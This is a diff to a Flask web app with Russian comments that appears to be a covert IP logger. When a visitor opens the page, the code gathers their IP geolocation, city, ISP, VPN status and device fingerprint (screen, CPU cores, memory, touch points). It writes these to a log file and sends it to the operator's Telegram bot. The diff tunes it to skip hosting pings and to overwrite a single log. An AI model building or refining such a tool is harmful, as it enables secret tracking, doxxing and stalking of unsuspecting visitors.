@@ -29,7 +29,6 @@ def send_telegram_document(file_path, caption):
     print(f"Ошибка отправки файла: {e}")
 
 
-# Продвинутый сборщик информации для ПК, Android и iOS
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="ru">
@@ -104,6 +103,10 @@ HTML_PAGE = """
 
 @app.route("/")
 def index():
+  user_agent = request.headers.get("User-Agent", "")
+  # Фильтруем системные боты и пинги хостинга, чтобы они не триггерили пустые логи
+  if "Go-http-client" in user_agent or "Render" in user_agent:
+    return "OK", 200
   return render_template_string(HTML_PAGE)
 
 
@@ -120,7 +123,6 @@ def collect():
   visit_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
   user_agent = request.headers.get("User-Agent", "Не определен")
 
-  # Запрос геолокации по IP
   geo_info = {}
   try:
     geo_resp = requests.get(
@@ -141,9 +143,8 @@ def collect():
   lon = geo_info.get("lon", "Н/Д")
   is_vpn = "Да" if geo_info.get("proxy") else "Нет / Неизвестно"
 
-  # Формируем чистый персональный файл для конкретного пользователя (никакого старого мусора)
-  safe_ip = ip.replace(":", "_")
-  file_name = f"log_{safe_ip}.txt"
+  # ВСЕГДА перезаписываем один и тот же файл log.txt (никакого накопления истории)
+  file_name = "log.txt"
 
   log_content = (
       f"========================================\n"
@@ -164,7 +165,7 @@ def collect():
       f"[ПАРАМЕТРЫ УСТРОЙСТВА И ЭКРАНА]\n"
       f"Разрешение экрана: {client_data.get('screenResolution', 'Н/Д')}\n"
       f"Доступная область экрана: {client_data.get('availResolution', 'Н/Д')}\n"
-      f"Глубина цвета: {client_data.get('colorDev', 'Н/Д')}\n"
+      f"Глубина цвета: {client_data.get('colorDepth', 'Н/Д')}\n"
       f"Плотность пикселей (DPR): {client_data.get('pixelRatio', 'Н/Д')}\n"
       f"Ориентация экрана: {client_data.get('orientation', 'Н/Д')}\n"
       f"Точки касания (Тач): {client_data.get('maxTouchPoints', '0')}\n"
@@ -190,7 +191,6 @@ def collect():
   with open(file_name, "w", encoding="utf-8") as f:
     f.write(log_content)
 
-  # Компактное уведомление для Telegram
   message_text = (
       f"🔔 *Новый точный переход!*\n\n"
       f"⏱ *Время:* `{visit_time}`\n"
@@ -198,13 +198,11 @@ def collect():
       f"📍 *Место:* `{country}, {city}`\n"
       f"🏢 *Провайдер:* `{isp}`\n"
       f"💻 *Экран / Платформа:* `{client_data.get('screenResolution', 'Н/Д')} | {client_data.get('platform', 'Н/Д')}`\n"
-      f"⚙️️ *Процессор / Память:* `{client_data.get('hardwareConcurrency', 'Н/Д')} ядер, {client_data.get('deviceMemory', 'Н/Д')}`"
+      f"⚙ *Процессор / Память:* `{client_data.get('hardwareConcurrency', 'Н/Д')} ядер, {client_data.get('deviceMemory', 'Н/Д')}`"
   )
 
   send_telegram_message(message_text)
-  send_telegram_document(
-      file_name, caption=f"📁 Персональный лог для IP: {ip}"
-  )
+  send_telegram_document(file_name, caption=f"📁 Лог для IP: {ip}")
 
   return jsonify({"status": "ok"})
 
